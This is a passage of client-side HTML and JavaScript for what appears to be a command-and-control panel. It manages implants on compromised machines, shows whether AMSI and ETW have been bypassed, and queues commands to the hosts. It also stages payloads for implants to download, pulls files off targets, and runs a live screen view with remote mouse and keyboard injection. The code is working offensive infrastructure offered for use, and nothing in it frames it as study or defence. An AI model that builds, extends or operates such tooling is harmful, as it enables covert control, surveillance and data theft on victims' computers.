  </div>
  <div id="rail-right">
    <div id="rail-tabs">
      <div class="rtab active" id="rtab-activity" onclick="switchRail('activity')">Activity</div>
      <div class="rtab" id="rtab-payload" onclick="switchRail('payload')">Payload</div>
    </div>
    <div id="feed"><div class="no-audit">No activity yet</div></div>
    <div id="payload-pane">
      <div class="drop" id="drop" onclick="document.getElementById('pl-file').click()">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 16V4m0 0 4.5 4.5M12 4 7.5 8.5"/><path d="M4 15v3a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-3"/></svg>
        <div class="d1">Drop payload or click to upload</div>
        <div class="d2">staged in memory · max 32 MB</div>
      </div>
      <input type="file" id="pl-file" style="display:none" onchange="payloadSelected(this.files[0])">
      <div id="pl-info"></div>
      <div class="pl-note">The staged payload is served to implants over the beacon-authenticated <span style="color:var(--acc)">/payload</span> endpoint — retrieve it on the target with a <span style="color:var(--acc)">download</span> task.</div>
    </div>
  </div>
</div>
<div id="toasts"></div>
<div id="modal-ov"><div class="modal"><h3 id="m-title"></h3><p id="m-body"></p>
  <div class="m-btns"><button class="m-cancel" onclick="modalResolve(false)">Cancel</button>
  <button class="m-ok" id="m-ok" onclick="modalResolve(true)">Confirm</button></div></div></div>
<div id="palette-ov"><div class="palette">
  <div class="pal-in"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.8-3.8"/></svg>
  <input id="pal-input" placeholder="Type a command or search nodes…" oninput="palRender()" onkeydown="palKey(event)">
  <kbd>esc</kbd></div>
  <div id="pal-list"></div>
</div></div>
<script>
(function(){
  const token=sessionStorage.getItem('ghost_token');
  if(!token){location.href='/';return;}
  let selectedSid=null,currentTab='console',selectedStatus=null;
  let cmdHistory=[],cmdHistIdx=-1,lastResultCount=0,lastBeaconTs=null;
  let lastSessions=[];

  /* ── helpers ──────────────────────────────────────────────────────── */
  function fmt(s){if(!s&&s!==0)return'—';s=Math.floor(s);return s<60?s+'s':s<3600?Math.floor(s/60)+'m '+((s%60)||'')+'s':Math.floor(s/3600)+'h '+Math.floor((s%3600)/60)+'m';}
  function fmtBytes(n){return n<1024?n+' B':n<1048576?(n/1024).toFixed(1)+' KB':(n/1048576).toFixed(2)+' MB';}
  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
  function $(id){return document.getElementById(id);}
  function countUp(el,v){
    v=Number(v)||0;const old=Number(el._v||0);el._v=v;
    if(old===v){el.textContent=String(v);return;}
    const t0=performance.now(),dur=380;
    (function step(t){const p=Math.min(1,(t-t0)/dur),e=1-Math.pow(1-p,3);
      el.textContent=String(Math.round(old+(v-old)*e));
      if(p<1)requestAnimationFrame(step);})(t0);
  }
  function tick(){
    const s=new Date().toLocaleString('en-US',{timeZone:'Asia/Kathmandu',hour12:true,month:'short',day:'2-digit',year:'numeric',hour:'numeric',minute:'2-digit',second:'2-digit'});
    $('clock').textContent=s+' NPT';
  }
  function updateBeaconAge(){
    const el=$('st-beacon');
    if(!lastBeaconTs){el.textContent='—';el.className='val';return;}
    const secs=Math.floor((Date.now()-lastBeaconTs)/1000);
    el.textContent=fmt(secs)+' ago';
    el.className='val '+(secs<120?'g':secs<600?'a':'r');
  }
  function updateCardIdles(){
    document.querySelectorAll('.node[data-idle0]').forEach(n=>{
      const idle0=Number(n.dataset.idle0),at=Number(n.dataset.at);
      const idle=Math.max(0,idle0+(Date.now()-at)/1000);
      const t=n.querySelector('.n-idle');if(t)t.textContent='idle '+fmt(idle);
      const f=n.querySelector('.n-fill');
      if(f){const pct=Math.max(3,100-(idle/1800)*100);f.style.width=pct+'%';
        f.className='n-fill'+(idle<120?'':idle<900?' warn':' stale');}
      const d=n.querySelector('.n-dot');
      if(d&&!n.dataset.statusLocked)d.className='n-dot'+(idle<180?' live':' stale');
    });
  }

  /* ── toasts ───────────────────────────────────────────────────────── */
  const TICONS={ok:'&#10003;',err:'&#10005;',warn:'!',info:'i'};
  function toast(msg,type='ok',dur=2600){
    const box=$('toasts');
    const el=document.createElement('div');
    el.className='toast '+type;
    el.innerHTML='<span class="tico">'+TICONS[type]+'</span><span>'+esc(msg)+'</span>';
    box.appendChild(el);
    setTimeout(()=>{el.classList.add('out');setTimeout(()=>el.remove(),260);},dur);
  }
  window.toast=toast;

  /* ── modal confirm ────────────────────────────────────────────────── */
  let _modalRes=null;
  function askConfirm(title,body,okText='Confirm',danger=false){
    return new Promise(res=>{
      _modalRes=res;
      $('m-title').textContent=title;$('m-body').textContent=body;
      const ok=$('m-ok');ok.textContent=okText;ok.className='m-ok'+(danger?' danger':'');
      $('modal-ov').classList.add('show');
    });
  }
  function modalResolve(v){$('modal-ov').classList.remove('show');if(_modalRes){_modalRes(v);_modalRes=null;}}
  window.modalResolve=modalResolve;

  /* ── api ──────────────────────────────────────────────────────────── */
  async function api(path,opts={}){
    try{
      const t0=performance.now();
      const r=await fetch(path,{headers:{'Content-Type':'application/json','X-Operator-Token':token},...opts});
      const ms=Math.round(performance.now()-t0);
      const lk=$('st-link');
      if(lk){lk.textContent=ms+'ms';lk.className='val '+(ms<300?'g':ms<800?'a':'r');}
      if(r.status===401){toast('Session expired','err');setTimeout(logout,1500);return null;}
      return r;
    }catch(e){const lk=$('st-link');if(lk){lk.textContent='—';lk.className='val';}toast('Network error','err');return null;}
  }
  function logout(){sessionStorage.removeItem('ghost_token');fetch('/logout',{method:'POST'}).finally(()=>{location.href='/logout';});}
  window.logout=logout;

  /* ── sessions ─────────────────────────────────────────────────────── */
  function statusBadge(s,idle){
    const st=s.status||'pending';
    if(st==='pending')return'<span class="nbadge pending">PENDING</span>';
    if(st==='rejected')return'<span class="nbadge stale">REJECTED</span>';
    if(s.pending_tasks>0)return'<span class="nbadge tasks">'+s.pending_tasks+' TASK'+(s.pending_tasks>1?'S':'')+'</span>';
    return idle>180?'<span class="nbadge stale">STALE '+fmt(idle)+'</span>':'<span class="nbadge live">LIVE '+fmt(idle)+'</span>';
  }
  function renderSessions(){
    const list=$('session-list');
    const q=($('node-search').value||'').toLowerCase().trim();
    const sessions=lastSessions.filter(s=>{
      if(!q)return true;
      const hay=[s.session,s.recon?.hostname,s.recon?.user,s.remote_ip,'build '+(s.recon?.build)].join(' ').toLowerCase();
      return hay.includes(q);
    });
    if(!sessions.length){
      list.innerHTML='<div class="no-sessions"><span class="big">&#x25c8;</span>'+(lastSessions.length?'No nodes match filter':'Awaiting connections&hellip;')+'</div>';
      return;
    }
    list.innerHTML=sessions.map(s=>{
      const idle=s.idle_seconds||0,st=s.status||'pending';
      const dc=st==='pending'?'pending':(idle>180?'stale':'live');
      const isAdmin=s.recon?.elevated;
      const pct=Math.max(3,100-(idle/1800)*100);
      const fc=idle<120?'':idle<900?' warn':' stale';
      return `<div class="node${s.session===selectedSid?' active':''}" onclick="selectSession('${esc(s.session)}')" data-idle0="${idle}" data-at="${Date.now()}" data-status-locked="${st!=='accepted'?1:''}">
        <div class="n-top"><span class="n-dot ${dc}"></span>
          <span class="n-host">${esc(s.recon?.hostname||s.session.slice(0,20))}</span>
          ${isAdmin?'<span class="nbadge adm">ADM</span>':''}${statusBadge(s,idle)}</div>
        <div class="n-meta"><span class="hi">${esc(s.recon?.user||'?')}</span><span>&middot;</span>${esc(s.remote_ip)}<span>&middot;</span><span>b${esc(s.recon?.build||'?')}</span></div>
        <div class="n-fresh"><span class="n-track"><span class="n-fill${fc}" style="width:${pct}%"></span></span><span class="n-idle">idle ${fmt(idle)}</span></div>
      </div>`;
    }).join('');
  }
  window.renderSessions=renderSessions;

  async function refreshSessions(){
    const r=await api('/sessions');if(!r)return;
    let sessions;try{sessions=await r.json();}catch(e){return;}
    if(!Array.isArray(sessions))return;
    // Killed nodes are wiped from the console — they no longer render anywhere.
    lastSessions=sessions.filter(s=>(s.status||'pending')!=='killed')
                         .sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon));
    countUp($('st-nodes'),lastSessions.length);
    countUp($('node-count'),lastSessions.length);
    countUp($('st-pending'),lastSessions.filter(s=>(s.status||'pending')==='pending').length);
    countUp($('st-queued'),lastSessions.reduce((a,s)=>a+(s.pending_tasks||0),0));
    $('st-queued').className='val'+(lastSessions.some(s=>s.pending_tasks>0)?' c':'');
    const pendN=lastSessions.filter(s=>(s.status||'pending')==='pending').length;
    $('st-pending').className='val'+(pendN>0?' a':'');
    const pulse=$('pulse'),stxt=$('status-txt');
    const active=lastSessions.filter(s=>(s.status||'pending')==='accepted'&&(s.idle_seconds||0)<=180).length;
    const pendN2=lastSessions.filter(s=>(s.status||'pending')==='pending').length;
    if(active>0){pulse.className='pulse live';stxt.textContent='Live';stxt.style.color='var(--green)';}
    else if(lastSessions.length>0){pulse.className='pulse';pulse.style.background='var(--amber)';pulse.style.boxShadow='0 0 10px rgba(251,191,36,.7)';
      stxt.textContent=pendN2>0?'Pending':'Stale';stxt.style.color='var(--amber)';}
    else{pulse.className='pulse';pulse.style.background='';pulse.style.boxShadow='';stxt.textContent='Idle';stxt.style.color='';}
    const newest=lastSessions[0];
    if(newest)lastBeaconTs=new Date(newest.last_beacon).getTime();
    renderSessions();
    if(!selectedSid&&lastSessions.length===1)selectSession(lastSessions[0].session);
  }
  window.refreshSessions=refreshSessions;

  async function selectSession(sid){
    if(liveMode)stopLive();
    selectedSid=sid;lastResultCount=0;
    $('session-hero').style.display='flex';
    $('tabbar').style.display='flex';
    $('empty-state').style.display='none';
    $('console').dataset.sid='';
    $('sh-host').textContent=sid.slice(0,40);
    switchTab(currentTab);
    await Promise.all([refreshSessions(),fetchResults(),fetchRecon()]);
    const cur=lastSessions.find(s=>s.session===sid);
    applySessionState(cur);
  }
  window.selectSession=selectSession;

  function applySessionState(s){
    const st=s?(s.status||'pending'):'pending';
    selectedStatus=st;
    if(liveMode&&st!=='accepted')stopLive();
    const recon=s?.recon||{};
    $('sh-host').textContent=s?(recon.hostname||s.session.slice(0,40)):selectedSid;
    const stale=(s?.idle_seconds||0)>180;
    const sm=$('sh-status');
    const smap={pending:['PENDING','pending'],rejected:['REJECTED','stale'],accepted:[stale?'STALE':'LIVE',stale?'stale':'live']};
    const [lb,lc]=smap[st]||['UNKNOWN','stale'];
    sm.innerHTML='<span class="nbadge '+lc+'">'+lb+'</span>';
    const chips=[
      recon.user?{t:recon.user,cls:''}:null,
      s?.remote_ip?{t:s.remote_ip,cls:''}:null,
      recon.build?{t:'build '+recon.build,cls:''}:null,
      recon.elevated!=null?{t:recon.elevated?'ELEVATED':'non-admin',cls:recon.elevated?'bad':'warn'}:null,
      recon.amsi!=null?{t:'AMSI '+(recon.amsi?'bypassed':'intact'),cls:recon.amsi?'ok':'warn'}:null,
      recon.etw!=null?{t:'ETW '+(recon.etw?'bypassed':'intact'),cls:recon.etw?'ok':'warn'}:null,
      recon.hwbps!=null?{t:'HWBP '+(recon.hwbps?'cleared':'set'),cls:recon.hwbps?'ok':'warn'}:null
    ].filter(Boolean);
    $('sh-chips').innerHTML=chips.map(c=>'<span class="tchip '+c.cls+'">'+esc(c.t)+'</span>').join('');
    $('cmd-host').textContent=recon.hostname||'node';
    const isPending=st==='pending';
    $('pending-bar').style.display=isPending?'flex':'none';
    $('btn-accept-hdr').style.display=isPending?'':'none';
    $('btn-reject-hdr').style.display=isPending?'':'none';
    $('cmdbar').style.display=(isPending||st==='rejected')?'none':'block';
    if(!isPending)$('cmd-input').focus();
  }

  /* ── tabs ─────────────────────────────────────────────────────────── */
  function moveTabInd(){
    const act=document.querySelector('#tabbar .tab.active'),ind=$('tab-ind');
    if(!act||!ind)return;
    ind.style.left=act.offsetLeft+'px';ind.style.width=act.offsetWidth+'px';
  }
  function switchTab(tab){
    currentTab=tab;
    document.querySelectorAll('#tabbar .tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===tab));
    const op=$('console'),rp=$('recon'),lv=$('live-view'),fp=$('files-pane');
    if(selectedSid){
      op.style.display=(tab==='console'&&!liveMode)?'flex':'none';
      rp.style.display=(tab==='recon'&&!liveMode)?'block':'none';
      fp.style.display=(tab==='files'&&!liveMode)?'block':'none';
      lv.style.display=liveMode?'flex':'none';
    }
    requestAnimationFrame(moveTabInd);
  }
  window.switchTab=switchTab;
  window.addEventListener('resize',moveTabInd);

  /* ── results console ──────────────────────────────────────────────── */
  async function fetchResults(force){
    if(!selectedSid)return;
    const r=await api('/results/'+encodeURIComponent(selectedSid));if(!r)return;
    const data=await r.json();
    const box=$('console'),tc=$('tc-output');
    const entries=data.results||[];
    if(tc)tc.textContent=String(entries.length);
    const pollEl=$('sync-ind');
    if(pollEl){pollEl.textContent='synced';pollEl.style.color='var(--green)';setTimeout(()=>{if(pollEl)pollEl.style.color='';},1400);}
    if(!entries.length){
      if(box.dataset.sid!==selectedSid||force){box.innerHTML='<div class="console-empty">No output yet — run a command below or pick a quick action</div>';box.dataset.sid=selectedSid;}
      lastResultCount=0;return;
    }
    const hasNew=entries.length!==lastResultCount;
    if(!hasNew&&box.dataset.sid===selectedSid&&!force)return;
    const atBottom=box.scrollHeight-box.scrollTop-box.clientHeight<90;
    const sorted=entries.slice().sort((a,b)=>a.ts<b.ts?-1:1);
    const newCount=entries.length-lastResultCount;
    box.innerHTML=sorted.map((e,i)=>{
      if(e.output&&e.output.startsWith('[SCREENSHOT:BMP]\n')){
        const b64=e.output.slice(17).trim();
        return `<div class="result-entry${hasNew&&i>=(sorted.length-Math.max(newCount,0))?' new-flash':''}">
          <div class="result-hdr"><span class="r-idx">#${i+1}</span><span class="r-label shot">SCREENSHOT</span><span class="r-ts">${e.ts.replace('T',' ').slice(0,19)} UTC</span>
          <button class="r-copy" onclick="copyResult(this,${i})">COPY</button></div>
          <div class="result-body"><img src="data:image/bmp;base64,${esc(b64)}" alt="screenshot"></div></div>`;
      }
      const lines=esc(e.output).split('\n');
      const lineHtml=lines.map((l,li)=>`<div class="ln"><span class="ln-num">${li+1}</span><span class="ln-txt">${l||'&nbsp;'}</span></div>`).join('');
      const ts=e.ts.replace('T',' ').slice(0,19);
      const byteLen=new TextEncoder().encode(e.output).length;
      const isNew=hasNew&&i>=(sorted.length-Math.max(newCount,0));
      return `<div class="result-entry${isNew?' new-flash':''}">
        <div class="result-hdr"><span class="r-idx">#${i+1}</span><span class="r-label out">OUTPUT</span><span class="r-ts">${ts} UTC</span><span class="r-len">${byteLen} B &middot; ${lines.length} lines</span>
        <button class="r-copy" onclick="copyResult(this,${i})">COPY</button></div>
        <div class="result-body">${lineHtml}</div></div>`;
    }).join('');
    box._entries=sorted;box.dataset.sid=selectedSid;
    if(atBottom||hasNew)box.scrollTop=box.scrollHeight;
    lastResultCount=entries.length;
    // pending operator file-download → catch the [UPLOAD:...] result and save it
    if(dlWait){
      const ups=sorted.filter(e=>e.output&&e.output.startsWith('[UPLOAD:'));
      const hit=ups.length>dlWait.count?ups[ups.length-1]:null;
      if(hit){
        const name=hit.output.slice(8,hit.output.indexOf(']'));
        const b64=hit.output.slice(hit.output.indexOf(']')+1).trim();
        try{
          const bin=atob(b64);const arr=new Uint8Array(bin.length);
          for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);
          const a=document.createElement('a');
          a.href=URL.createObjectURL(new Blob([arr]));
          a.download=name;document.body.appendChild(a);a.click();a.remove();
          toast('Downloaded '+name+' ('+fmtBytes(arr.length)+')');
        }catch(err){toast('Download decode failed','err');}
        dlWait=null;
      }
    }
  }
  window.fetchResults=fetchResults;

  function copyResult(btn,idx){
    const box=$('console');
    const e=box._entries?.[idx];if(!e)return;
    navigator.clipboard.writeText(e.output).then(()=>toast('Copied to clipboard')).catch(()=>toast('Copy failed','err'));
  }
  window.copyResult=copyResult;

  async function clearResults(){
    if(!selectedSid)return;
    await api('/results/'+encodeURIComponent(selectedSid)+'?clear=1');
    lastResultCount=0;
    $('console').innerHTML='<div class="console-empty">Console cleared</div>';
    $('console').dataset.sid='';
    const tc=$('tc-output');if(tc)tc.textContent='0';
    toast('Console cleared','warn');
  }
  window.clearResults=clearResults;

  /* ── recon ────────────────────────────────────────────────────────── */
  async function fetchRecon(){
    if(!selectedSid)return;
    const s=lastSessions.find(x=>x.session===selectedSid);
    if(!s)return;
    const recon=s.recon||{};
    function cell(k,v,cls,icon){
      if(v==null||v==='')return'';
      return `<div class="rc-cell"><div class="rc-key">${icon?'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">'+icon+'</svg>':''}${esc(k)}</div><div class="rc-val ${cls||''}">${esc(String(v))}</div></div>`;
    }
    const icoHost='<rect x="3" y="4" width="18" height="14" rx="2"/><path d="M8 21h8"/>';
    const icoShield='<path d="M12 3l7 3v6c0 4.4-3 7.4-7 9-4-1.6-7-4.6-7-9V6l7-3Z"/>';
    const icoClock='<circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/>';
    const html=
      '<div class="rc-section"><div class="rc-title">Host</div><div class="rc-grid">'+
      cell('Hostname',recon.hostname,'acc',icoHost)+
      cell('Username',recon.user,'','<circle cx="12" cy="8" r="4"/><path d="M4 20c1.8-3.2 4.6-4.8 8-4.8s6.2 1.6 8 4.8"/>')+
      cell('OS Build',recon.build,'','<rect x="3" y="4" width="18" height="14" rx="2"/><path d="M8 21h8"/>')+
      cell('Elevation',recon.elevated!=null?(recon.elevated?'SYSTEM ADMIN':'Standard user'):'',(recon.elevated?'bad':'warn'),'<path d="M12 3l7 3v6c0 4.4-3 7.4-7 9-4-1.6-7-4.6-7-9V6l7-3Z"/>')+
      '</div></div>'+
      '<div class="rc-section"><div class="rc-title">Evasion</div><div class="rc-evas">'+
      ['amsi:AMSI','etw:ETW','hwbps:HW Breakpoints'].map(p=>{
        const k=p.split(':')[0],label=p.split(':')[1];
        const on=recon[k];
        return `<div class="rc-cell"><div class="rc-key" style="justify-content:center">${esc(label)}</div>
          <div class="rc-big ${on?'ok':'bad'}">${on?'BYPASSED':'INTACT'}</div></div>`;
      }).join('')+'</div></div>'+
      '<div class="rc-section"><div class="rc-title">Session</div><div class="rc-grid">'+
      cell('Remote IP',s.remote_ip,'','<circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/>')+
      cell('First Seen',s.first_seen?.replace('T',' ').slice(0,19)+' UTC','',icoClock)+
      cell('Last Beacon',s.last_beacon?.replace('T',' ').slice(0,19)+' UTC','',icoClock)+
      cell('Idle',fmt(s.idle_seconds||0),(s.idle_seconds>180?'warn':''),icoClock)+
      cell('Queued Tasks',String(s.pending_tasks??0),(s.pending_tasks>0?'warn':''),'')+
      cell('Stored Results',String(s.result_count??0),'','')+
      '</div></div>';
    $('recon').innerHTML=html;
  }

  /* ── commands ─────────────────────────────────────────────────────── */
  async function sendCmd(preset){
    if(!selectedSid)return toast('No node selected','err');
    if(selectedStatus==='pending')return toast('Accept node first','warn');
    if(selectedStatus==='rejected')return toast('Node rejected','err');
    const input=$('cmd-input');
    const cmd=preset||input.value.trim();if(!cmd)return;
    if(!preset&&cmd){cmdHistory.unshift(cmd);if(cmdHistory.length>100)cmdHistory.pop();cmdHistIdx=-1;}
    const r=await api('/task',{method:'POST',body:JSON.stringify({session:selectedSid,cmd})});if(!r)return;
    const data=await r.json();
    if(data.status==='queued'){toast('Queued (depth='+data.queue_depth+')');if(!preset)input.value='';}
    else toast('Error: '+JSON.stringify(data),'err');
  }
  window.sendCmd=sendCmd;

  function cmdInsert(text){
    const input=$('cmd-input');
    input.value=text;input.focus();
  }
  window.cmdInsert=cmdInsert;

  function handleKey(e){
    if(e.key==='Enter'){sendCmd();return;}
    const input=$('cmd-input');
    if(e.key==='ArrowUp'){e.preventDefault();if(cmdHistIdx<cmdHistory.length-1){cmdHistIdx++;input.value=cmdHistory[cmdHistIdx];}}
    else if(e.key==='ArrowDown'){e.preventDefault();if(cmdHistIdx>0){cmdHistIdx--;input.value=cmdHistory[cmdHistIdx];}else{cmdHistIdx=-1;input.value='';}}
  }
  window.handleKey=handleKey;

  async function killSession(){
    if(!selectedSid)return;
    if(liveMode)stopLive();
    if(!await askConfirm('Kill node','Terminate session '+selectedSid+'? The implant will exit on next check-in.','Kill node',true))return;
    const r=await api('/sessions/'+encodeURIComponent(selectedSid),{method:'DELETE'});if(!r)return;
    toast('Kill queued — node exits on next check-in','warn');selectedSid=null;
    $('sh-host').textContent='—';
    ['session-hero','tabbar','console','recon','cmdbar'].forEach(id=>{$(id).style.display='none';});
    $('empty-state').style.display='flex';
    await refreshSessions();
  }
  window.killSession=killSession;

  /* ── accept / reject ──────────────────────────────────────────────── */
  const ac={task_queued:'&#187;',kill_session:'&#10005;',beacon:'&#9679;',beacon_rejected:'&#10005;',
    session_accepted:'&#10003;',session_rejected:'&#10005;',payload_uploaded:'&#8593;',
    payload_downloaded:'&#8595;',auth_fail:'&#215;'};
  const acCol={task_queued:'var(--amber)',kill_session:'var(--red)',beacon:'var(--green)',beacon_rejected:'var(--red)',
    session_accepted:'var(--green)',session_rejected:'var(--red)',payload_uploaded:'var(--orange)',
    payload_downloaded:'var(--acc)',auth_fail:'var(--red)'};

  async function acceptSession(sid){
    const r=await api('/sessions/'+encodeURIComponent(sid)+'/accept',{method:'POST'});if(!r)return;
    if(r.ok)toast('Session accepted');
    else toast('Accept failed: '+r.status,'err');
    await refreshSessions();fetchAudit();
    if(sid===selectedSid)applySessionState({...lastSessions.find(s=>s.session===sid),status:'accepted'});
  }
  async function rejectSession(sid){
    const r=await api('/sessions/'+encodeURIComponent(sid)+'/reject',{method:'POST'});if(!r)return;
    if(r.ok)toast('Session rejected','warn');
    else toast('Reject failed: '+r.status,'err');
    await refreshSessions();fetchAudit();
    if(sid===selectedSid)applySessionState({...lastSessions.find(s=>s.session===sid),status:'rejected'});
  }
  function acceptSelected(){if(selectedSid)acceptSession(selectedSid);}
  function rejectSelected(){if(selectedSid)rejectSession(selectedSid);}
  window.acceptSelected=acceptSelected;window.rejectSelected=rejectSelected;
  window.acceptSession=acceptSession;window.rejectSession=rejectSession;

  /* ── audit feed ───────────────────────────────────────────────────── */
  async function fetchAudit(){
    const r=await api('/audit?limit=200');if(!r)return;
    let data;try{data=await r.json();}catch(e){return;}
    const list=$('feed');
    const entries=((data&&data.entries)||[]).slice().reverse();
    if(!entries.length){list.innerHTML='<div class="no-audit">No activity yet</div>';return;}
    list.innerHTML=entries.map(e=>{
      const t=new Date(e.ts).toLocaleString('en-US',{timeZone:'Asia/Kathmandu',hour12:true,month:'short',day:'2-digit',hour:'numeric',minute:'2-digit',second:'2-digit'});
      const action=e.action||'';const color=acCol[action]||'var(--txt2)';
      const sid=e.detail?.sid||'';
      // Buttons only while the session is still pending right now — not on
      // stale historical beacon entries of sessions already handled.
      const isPending=action==='beacon'&&sid&&lastSessions.some(s=>s.session===sid&&(s.status||'pending')==='pending');
      return `<div class="audit-entry ${esc(action)}">
        <div class="a-ico" style="color:${color}">${ac[action]||'&#9679;'}</div>
        <div class="a-body">
          <div class="a-action" style="color:${color}">${esc(action.replace(/_/g,' '))}</div>
          ${sid?'<div class="a-sid">'+esc(sid.slice(0,34))+'</div>':''}
          <div class="a-ip">${esc(e.ip)}</div>
          ${isPending?'<div class="a-btns"><button class="a-btn accept" onclick="acceptSession(\''+esc(sid)+'\')">ACCEPT</button><button class="a-btn reject" onclick="rejectSession(\''+esc(sid)+'\')">REJECT</button></div>':''}
        </div>
        <div class="a-time">${t}</div>
      </div>`;
    }).join('');
  }
  window.fetchAudit=fetchAudit;

  async function clearAudit(){
    if(!await askConfirm('Clear audit log','This permanently removes all recorded activity entries.','Clear log',true))return;
    await api('/audit/clear',{method:'POST'});
    $('feed').innerHTML='<div class="no-audit">No activity yet</div>';
    toast('Audit log cleared','warn');
  }
  window.clearAudit=clearAudit;

  /* ── right rail tabs ──────────────────────────────────────────────── */
  function switchRail(which){
    $('rtab-activity').classList.toggle('active',which==='activity');
    $('rtab-payload').classList.toggle('active',which==='payload');
    $('feed').style.display=which==='activity'?'flex':'none';
    $('payload-pane').style.display=which==='payload'?'flex':'none';
  }
  window.switchRail=switchRail;

  /* ── payload ──────────────────────────────────────────────────────── */
  let plMeta=null;
  async function payloadSelected(file){
    if(!file)return;
    if(file.size>32*1024*1024)return toast('Payload too large (max 32 MB)','err');
    const r=await api('/payload',{method:'POST',body:file,headers:{'X-Operator-Token':token,'Content-Type':'application/octet-stream'}});
    if(!r)return;
    const data=await r.json().catch(()=>null);
    if(data&&data.status==='ok'){
      plMeta={name:file.name,bytes:data.bytes,ts:new Date()};
      renderPayload();
      toast('Payload staged ('+fmtBytes(data.bytes)+')');
      fetchAudit();
    }else toast('Upload failed','err');
  }
  window.payloadSelected=payloadSelected;
  function renderPayload(){
    const el=$('pl-info');
    if(!plMeta){el.innerHTML='';return;}
    el.innerHTML='<div class="pl-card">'+
      '<div class="pl-row"><span class="k">File</span><span class="v">'+esc(plMeta.name)+'</span></div>'+
      '<div class="pl-row"><span class="k">Size</span><span class="v">'+fmtBytes(plMeta.bytes)+'</span></div>'+
      '<div class="pl-row"><span class="k">Staged</span><span class="v">'+plMeta.ts.toLocaleTimeString('en-US',{hour12:false})+'</span></div>'+
      '</div>';
  }
  const drop=$('drop');
  ['dragover','dragenter'].forEach(ev=>drop.addEventListener(ev,e=>{e.preventDefault();drop.classList.add('over');}));
  ['dragleave','dragend'].forEach(ev=>drop.addEventListener(ev,()=>drop.classList.remove('over')));
  drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('over');
    payloadSelected(e.dataTransfer.files[0]);});

  /* ── live view ─────────────────────────────────────────────────────── */
  let liveMode=false,liveTimer=null,lastShotTs=null,liveBtns=0,liveLastMove=null;
  function stopLive(){
    if(!liveMode)return;
    liveMode=false;
    if(liveTimer){clearInterval(liveTimer);liveTimer=null;}
    lastShotTs=null;liveBtns=0;liveLastMove=null;
    if(selectedSid&&selectedStatus==='accepted')sendCmd('sleep 18');
    const b=$('btn-live');if(b){b.textContent='Live';b.classList.remove('live-on');}
    if(selectedSid)switchTab(currentTab);
  }
  async function toggleLive(){
    if(!selectedSid)return toast('No node selected','err');
    if(liveMode)return stopLive();
    if(selectedStatus!=='accepted')return toast('Accept node first','warn');
    liveMode=true;lastShotTs=null;liveBtns=0;liveLastMove=null;
    const b=$('btn-live');b.textContent='Stop Live';b.classList.add('live-on');
    await api('/results/'+encodeURIComponent(selectedSid)+'?clear=1');
    lastResultCount=0;$('console').dataset.sid='';
    sendCmd('sleep 1');
    switchTab(currentTab);
    liveTick();
    liveTimer=setInterval(liveTick,2000);
  }
  async function liveTick(){
    if(!liveMode||!selectedSid)return;
    const cur=lastSessions.find(s=>s.session===selectedSid);
    if(!cur||(cur.status||'pending')!=='accepted')return stopLive();
    // One combined task per frame: optional mouse move + scaled capture.
    // Don't over-queue if the implant can't keep up.
    if((cur.pending_tasks||0)<3){
      const mv=liveLastMove||{nx:-1,ny:-1};
      sendCmd(`!live 50 ${mv.nx} ${mv.ny} ${liveBtns}`);
    }
    const r=await api('/results/'+encodeURIComponent(selectedSid));if(!r)return;
    const data=await r.json().catch(()=>null);if(!data)return;
    const shots=(data.results||[]).filter(e=>e.output&&e.output.startsWith('[SCREENSHOT:BMP]\n'));
    if(!shots.length)return;
    const latest=shots[shots.length-1];
    if(latest.ts===lastShotTs)return;
    lastShotTs=latest.ts;
    $('live-img').src='data:image/bmp;base64,'+latest.output.slice(17).trim();
    $('live-ts').textContent='frame '+latest.ts.replace('T',' ').slice(0,19)+' UTC';
  }
  function liveNorm(e){
    const r=$('live-img').getBoundingClientRect();
    const nx=Math.max(0,Math.min(9999,Math.round((e.clientX-r.left)/r.width*10000)));
    const ny=Math.max(0,Math.min(9999,Math.round((e.clientY-r.top)/r.height*10000)));
    return {nx,ny};
  }
  function liveBtnBit(e){return e.button===0?1:e.button===2?4:e.button===1?2:0;}
  const liveEl=$('live-view');
  liveEl.addEventListener('contextmenu',e=>e.preventDefault());
  liveEl.addEventListener('mousedown',e=>{
    if(!liveMode)return;
    liveBtns|=liveBtnBit(e);
    const p=liveNorm(e);liveLastMove=p;
    sendCmd(`!input m ${p.nx} ${p.ny} ${liveBtns}`);
    e.preventDefault();
  });
  liveEl.addEventListener('mouseup',e=>{
    if(!liveMode)return;
    liveBtns&=~liveBtnBit(e);
    const p=liveNorm(e);liveLastMove=p;
    sendCmd(`!input m ${p.nx} ${p.ny} ${liveBtns}`);
    e.preventDefault();
  });
  liveEl.addEventListener('mousemove',e=>{
    if(!liveMode)return;
    liveLastMove=liveNorm(e);   // rides along with the next frame tick
  });
  const VKMAP={Enter:13,Backspace:8,Tab:9,Escape:27,Delete:46,Insert:45,
    ArrowLeft:37,ArrowUp:38,ArrowRight:39,ArrowDown:40,
    Shift:16,Control:17,Alt:18,CapsLock:20,Home:36,End:35,PageUp:33,PageDown:34,Space:32};
  function keyToVk(e){
    if(VKMAP[e.key]!=null)return VKMAP[e.key];
    if(e.key.length===1)return e.key.toUpperCase().charCodeAt(0);
    return null;
  }
  liveEl.addEventListener('keydown',e=>{
    if(!liveMode)return;
    const vk=keyToVk(e);if(vk==null)return;
    e.preventDefault();
    sendCmd(`!input k ${vk} 1`);
  });
  liveEl.addEventListener('keyup',e=>{
    if(!liveMode)return;
    const vk=keyToVk(e);if(vk==null)return;
    e.preventDefault();
    sendCmd(`!input k ${vk} 0`);
  });
  window.toggleLive=toggleLive;

  /* ── file browser ─────────────────────────────────────────────────── */
  let filesCwd='';
  function jsq(s){return esc(String(s==null?'':s).replace(/\\/g,'\\\\'));}
  function parentPath(p){
